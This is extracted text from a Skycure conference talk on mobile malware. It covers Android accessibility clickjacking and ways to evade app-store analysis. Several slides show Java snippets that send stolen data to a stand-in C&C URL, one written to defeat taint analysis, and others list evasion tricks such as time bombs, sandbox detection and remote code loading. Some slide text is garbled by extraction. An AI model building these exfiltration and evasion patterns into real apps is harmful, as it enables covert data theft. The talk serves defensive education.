SESSION ID: HTA-R03
The Ultimate Reason Why Hackers Are Winning The Mobile Malware Battle
#RSAC

Yair Amit
CTO & Co-Founder Skycure
Adi Sharabani
CEO & Co-Founder Skycure

#RSAC
Agenda
Evolution of mobile malware Malware demo: bypassing app sandboxing Evading current malware detection techniques Recommendations & summary

#RSAC
Mobile Malware Evolution
3

#RSAC
Malware Evolution
4

#RSAC
Mobile Malware Evolution
Motivation:
What you do, where you go, what you say, 24/7
Challenges of mobile malware attackers:
Apple's App-Store and Google Play screening process Acquiring privileges requires unnatural end-user flows
What attackers are doing?
5

#RSAC
XcodeGhost
Compiler Malware:
Malicious development environment Legitimate apps packed with malicious code Malware version enters AppStore with developers' credentials
6

#RSAC
YiSpecter
Jailbroken and non-jailbroken devices Aggressive distribution Apple's private APIs
7

Evolution of Android Malware

2011
Google Play is riddled with malware

Google introduces technologies such as
"Bouncer" and "Verify Apps"

#RSAC
2016
3rd party stores are riddled with malware

#RSAC
Security Implications of Accessibility Features
Accessibility frameworks are traditionally good candidates:
2007 ­ Windows Vista speech recognition exploit 2013 ­ Siri allows to bypass iPhone lock screen 2014 ­ Siri Lets Anyone Bypass Your iPhone's Lockscreen -- Feature or Bug? 2015 ­ iOS 9 allows access to photos and contacts on a passcode locked iPhone
Exploitation of Android Accessibility Framework
 Has full access to content in other apps (e.g. read emails)  Ability to monitor user activity and take actions accordingly
9

#RSAC
Would You Fall For This?
10

#RSAC
Android Clickjacking
11

#RSAC
Android Clickjacking

Android overlay view
Can be presented on top of other apps Can be used to pass touch events to underlying apps
Result:
Users can be tricked to perform actions without their knowledge
Example:
Android ransomware (Android.Lockdroid.E) gaining device administrator permissions
12

Source: Symantec

#RSAC
Live Demo:
Accessibility Clickjacking
13

#RSAC
Taking it to The Next Level
Android.Lockdroid.E uses Clickjacking to lure victims to confirm admin permissions Accessibility Clickjacking + performAction method can approve the admin permissions without any user intervention

#RSAC
Malware Analysis Techniques and Why They Fail
15

#RSAC
Signature-Based Analysis

Dynamic Analysis
The Automated Hacker

#RSAC
Identification techniques: · Network activity · Debugging · Instrumentation · Etc.

17

#RSAC
Evading Dynamic Analysis
Make sure the malicious code is not executed during the analysis
Examples:
Time bombs Location bombs, IP bombs, etc.
Action-based bombs Sandbox detection
Is the contact list full and "real"?
Same for meetings, emails, accounts, etc.
Am I running in a debugger? [Anti debugging] Victim detection
Targeted attacks
18

Static Analysis

#RSAC

The Automated Code Auditor

Static analysis unpacks the app and analyses its code & resources
19

Static Analysis

#RSAC

The Automated Code Auditor

String data = getSensitiveData();
// ... String data = getSensitiveData();
String deviceName =SoguercteDe­vaimceeNthaomde(re)t;urning sensitive data
// ... String data2 = "DeviceName=" + deviceName +
"&senesitiveData=" + data;
String data2 = ............................................................... + data;
Sink -/a/m.e.th.od leakinPgoosuttRdeaqtauest("http://www.remote.cnc/data.php", data2);

PostRequest("http://www.remote.cnc/data.php", data2);

Static Analysis

#RSAC

Taint Analysis Example

Sources:

Sinks:
21

#RSAC
Evading Static Analysis
Exploiting the Static Analysis FP/FN tradeoff
Arrays, files, etc.
String data = getSensitiveData(); String data2 = ""; for (int i=0; i<data.length(); i++) {
if (data.charAt(i) == 'a') data2 += 'a';
if (data.charAt(i) == 'b') data2 += 'b'; ...
} PostRequest("http://www.remote.cnc/data.php", data2);
22

#RSAC
Evading Static Analysis
Exploiting the Static Analysis FP/FN tradeoff
Arrays, files, etc.
Dynamic flows Dynamic code
Reflection Remote server
DEX/apk HTML & JavaScript (also applicable for iOS)
23

How to detect malicious behavior,

#RSAC

if that does not happen?

Analyzer
Get code to execute Naïve code returned

Malicious code
Malicious code
Malicious code

#RSAC
App Repackaging

Decode

Patch

Rebuild

Sign

Patched app loads code from remote server

#RSAC
Live Demo
26

What about the CNC Server?

#RSAC

Can it be blacklisted?

Analyzer
Get code to execute Naïve code returned

Malicious code
Malicious code
Malicious code

#RSAC
So What Can Defenders Do?
Change the paradigm:
Analyzing an app by itself is clearly not enough Utilize analysis of similar apps on other devices
Crowd-wisdom intelligence:
Compare app traits to all millions of apps that have been seen before Ability to track legitimate app behaviors Ability to track malicious app behaviors
28

#RSAC
Recommendations
If possible, download apps only from official stores Educate employees on the threats,
as you would for other forms of computer-security threats
Review the permissions requested by each app before installation
Upgrade your device OS to the latest version Install a Mobile Threat Defense solution
29

#RSAC
A debt from our RSA USA 2015 session...
30

Known iOS Vulnerabilities

374

Apr. 15' Est.

250
200
150
100
50
0 2007 2008 2009 2010 2011 2012 2013 2014 2015 Number of CVEs Trajectory (Apr 15')
Source: Skycure analysis based of CVEdetails.com

#RSAC

#RSAC
Remember
Malware is only one element of mobile the threat landscape Physical, Network, Malware and Vulnerability threats
On the organizational level, build a mobile security strategy that addresses the Mobile Threats Landscape
32

#RSAC
Q&A And Next Steps
contact@skycure.com https://www.skycure.com https://blog.skycure.com https://maps.skycure.com @SkycureSecurity, @AdiSharabani, @YairAmit /Skycure
33

